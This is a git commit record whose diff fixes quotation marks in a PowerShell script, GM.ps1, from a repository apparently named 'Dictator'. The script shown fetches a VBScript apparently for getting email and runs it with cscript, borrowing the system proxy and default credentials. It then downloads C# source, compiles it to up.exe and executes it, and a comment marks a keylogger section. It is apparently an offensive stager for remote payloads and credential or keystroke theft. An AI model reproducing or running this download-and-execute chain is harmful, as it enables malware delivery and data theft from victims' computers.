cd9a7a28ebe8a8a7bb99eed77dde334264958f8c
FurqanKhan1 <furqankhan08@gmail.com>
2019-04-14 16:29:47 +0400

    Commas Fixed

--- GM.ps1
+++ GM.ps1
@@ -7,14 +7,14 @@ $url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/get_email.vb
 $b=new-object net.webclient;
 $b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
 $b.DownloadFile($url, $my_path) ;
-$command = “cmd /C cscript ”+$my_path
+$command = "cmd /C cscript "+$my_path
 invoke-expression $command
 $my_path_c="D:\up.cs"
 $url_c='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/up.cs';
 $b.DownloadFile($url_c, $my_path_c) ;
-$command = “cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\up.exe D:\up.cs”
+$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\up.exe D:\up.cs"
 invoke-expression $command
-$command=“cmd /C D:\up.exe”
+$command="cmd /C D:\up.exe"
 invoke-expression $command
 
 #KL part
